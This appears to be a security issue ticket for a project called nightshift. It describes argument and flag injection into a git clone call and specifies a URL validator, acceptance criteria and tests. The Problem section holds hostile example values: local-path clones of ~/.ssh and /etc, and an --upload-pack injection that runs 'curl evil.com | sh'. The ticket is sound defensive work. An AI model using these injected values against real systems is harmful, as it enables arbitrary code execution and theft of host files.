# Validate eval_target_repo URL before passing to git clone (C-1)

## Problem

`run_eval_full()` in `nightshift/owl/eval_runner.py` reads `eval_target_repo` from config and passes it directly to `subprocess.run(["git", "clone", "--depth", "1", target, str(clone_dest)])`. The config loader only enforces that this field is a `str` -- no URL scheme or content validation is performed.

This enables two exploit paths:

1. **Local path clone:** A value like `/home/user/.ssh` or `file:///etc` causes git to clone from the local filesystem, reading sensitive host files into `/tmp/nightshift-eval`.

2. **Flag injection via `--upload-pack`:** A value like `--upload-pack=/usr/bin/id` is parsed by git as a flag before the URL positional, executing the specified command on the cloning machine. A malicious value `--upload-pack=bash -c 'curl evil.com | sh'` achieves arbitrary code execution.

Because `subprocess.run` is called with a list (not `shell=True`), shell metacharacters in the URL are not a risk. The git binary itself is the attack surface.

## Fix

Add a URL validation function and call it in two places:

1. In `_build_config()` in `nightshift/settings/config.py` -- validate `eval_target_repo` when loading config.
2. In `run_eval_full()` in `nightshift/owl/eval_runner.py` -- validate `target` immediately before the `subprocess.run` call as belt-and-suspenders.

The validator must:
- Reject any value not starting with `https://` or `git@`
- Reject any value starting with `--` (flag injection)
- Reject any value starting with `file://` or `/` (local path clone)

A simple approach: `if not (target.startswith("https://") or target.startswith("git@")): raise NightshiftError(...)`.

Place the validator in `nightshift/core/shell.py` (alongside `validate_verify_command`) or in `nightshift/settings/config.py`.

## Acceptance Criteria

- [ ] `eval_target_repo` values that start with `--`, `/`, or `file://` are rejected with a descriptive NightshiftError at config load time
- [ ] Only `https://` and `git@` schemes are accepted
- [ ] A second guard in `run_eval_full()` rejects invalid URLs before the subprocess call
- [ ] Tests cover: valid `https://` URL passes, valid `git@github.com:...` passes, `--upload-pack=...` rejected, `file:///etc` rejected, `/tmp/something` rejected
- [ ] `make check` passes
